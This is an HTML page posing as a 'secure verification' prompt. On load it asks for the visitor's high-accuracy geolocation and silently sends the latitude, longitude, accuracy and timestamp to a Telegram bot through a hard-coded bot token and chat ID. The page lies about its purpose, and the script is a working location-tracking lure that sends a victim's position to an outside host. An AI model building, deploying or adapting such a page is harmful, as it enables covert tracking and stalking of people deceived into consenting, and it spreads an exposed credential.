<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Location Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      transition: background 0.5s ease;
    }h1 {
  font-size: 2em;
  margin-bottom: 10px;
}

p {
  margin: 0 0 20px;
  font-size: 1.1em;
  text-align: center;
}

button {
  padding: 12px 24px;
  font-size: 1em;
  border: none;
  border-radius: 30px;
  background-color: #ffcc00;
  color: #1e1e1e;
  cursor: pointer;
  transition: background-color 0.3s;
}

button:hover {
  background-color: #ffdb4d;
}

.toggle-theme {
  position: absolute;
  top: 20px;
  right: 20px;
  padding: 8px 14px;
  background-color: #444;
  color: white;
  border: none;
  border-radius: 20px;
  cursor: pointer;
}

  </style>
</head>
<body>
  <button class="toggle-theme" onclick="toggleTheme()">Toggle Theme</button>  <h1>üìç Allow Location Access</h1>
  <p>Please allow location to continue. Your location is used for secure verification only.</p>
  <button onclick="getLocation()">Allow Location</button>  <script>
    const darkTheme = {
      background: 'linear-gradient(135deg, #121212, #232323)',
      color: 'white',
    };
    const lightTheme = {
      background: 'linear-gradient(135deg, #1e3c72, #2a5298)',
      color: 'white',
    };

    let dark = false;

    function toggleTheme() {
      dark = !dark;
      document.body.style.background = dark ? darkTheme.background : lightTheme.background;
    }

    // Auto-request location on load
    window.onload = () => {
      getLocation();
    };

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
        });
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    function sendToTelegram(position) {
      const { latitude, longitude, accuracy } = position.coords;
      const date = new Date().toLocaleString();
      const message = `üìç New Location Received:%0Aüìå Lat: ${latitude}%0Aüìå Long: ${longitude}%0AüéØ Accuracy: ${accuracy} meters%0Aüïí Time: ${date}`;

      fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage?chat_id=6038115234&text=${message}`);
    }

    function showError(error) {
      alert("Failed to get location. Please try again and allow location access.");
    }
  </script></body>
</html>
